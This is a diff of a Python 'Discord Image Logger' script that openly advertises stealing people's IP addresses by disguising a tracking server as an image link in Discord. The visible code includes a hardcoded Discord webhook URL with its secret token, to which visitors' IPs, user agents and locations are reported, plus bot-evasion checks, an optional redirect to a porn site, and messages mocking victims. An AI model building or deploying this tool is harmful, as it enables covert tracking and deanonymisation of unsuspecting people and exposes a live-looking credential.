@@ -1,4 +1,4 @@
-# Discord Image Logger
+# Discord Image Logger Base Code
 # By Phobos
 
 from http.server import BaseHTTPRequestHandler
@@ -6,7 +6,7 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__description__ = "A simple application which allows you to steal IPs(requires using open original)"
 __version__ = "v2.3"
 __author__ = "Phobos"
 
@@ -14,8 +14,7 @@ config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1117194295984795678/1EOEj4LkZN_NODOuxsZ1lW90r7XeY_Qot_6ZANF-XXb6ZBuIMQDV4mlpiLu6ARFIzgMT",
     "image": "https://www.shutterstock.com/image-vector/click-here-button-hand-pointer-260nw-1187607886.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
@@ -29,7 +28,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been Ip-Logged by Phobos's Image Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": True, # Enable rich text?
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -51,7 +50,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "Https://Pornhub.com" # Link to the webpage to redirect to 
+        "page": "Https://pornhub.com" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -64,7 +63,7 @@ config = {
 }
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+                                                           # This feature is not very well tested mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -101,7 +100,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent to an idiot!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Image Logging** link was sent to someone!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -146,7 +145,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Got Rick Rolled! What a dumbass**
+            "description": f"""**A User Got Logged! What a dumbass**
 
 **Endpoint:** `{endpoint}`
             
@@ -181,9 +180,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # This IS NOT a rat or virus, it's just a loading image. (Made by Phobos! :D)
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+   
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -293,7 +292,7 @@ if (!currenturl.includes("g=")) {
             self.send_header('Content-type', 'text/html')
             self.end_headers()
 
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook')
             reportError(traceback.format_exc())
 
         return
